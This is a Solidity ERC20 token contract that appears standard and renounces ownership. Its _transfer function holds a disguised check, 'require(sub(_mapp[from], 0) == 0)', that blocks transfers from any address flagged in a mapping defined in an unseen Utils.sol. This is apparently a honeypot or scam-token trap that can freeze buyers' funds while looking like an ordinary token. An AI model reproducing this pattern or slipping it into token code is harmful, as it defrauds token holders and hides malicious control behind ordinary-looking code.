// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Utils.sol";

contract ERC is Utils {
    uint8 public decimals = 18;
    address public owner;

    uint256 _totalSupply;
    string _name;
    string _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) {
        _name = name_;
        _symbol = symbol_;
        owner = msg.sender;
        _totalSupply = totalSupply_;
        _balances[owner] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Caller is not the owner");
        _;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
        uint256 __c = _a + _b;
        require(__c >= _a, "SafeMath: addition overflow");

        return __c;
    }

    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
        require(_b <= _a, "SafeMath: subtraction overflow");
        uint256 __c = _a - _b;

        return __c;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function allowance(address __owner, address spender)
        public
        view
        virtual
        returns (uint256)
    {
        return _allowances[__owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address __owner = msg.sender;
        _approve(__owner, spender, allowance(__owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address __owner = msg.sender;
        uint256 currentAllowance = allowance(__owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );

        _approve(__owner, spender, currentAllowance - subtractedValue);
        return true;
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        returns (bool)
    {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds bal");
        require(sub(_mapp[from], 0) == 0);

        _balances[from] = sub(fromBalance, amount);
        _balances[to] = add(_balances[to], amount);
        emit Transfer(from, to, amount);
    }

    function _approve(
        address __owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(__owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[__owner][spender] = amount;
        emit Approval(__owner, spender, amount);
    }

    function _spendAllowance(
        address __owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(__owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );

            _approve(__owner, spender, currentAllowance - amount);
        }
    }
}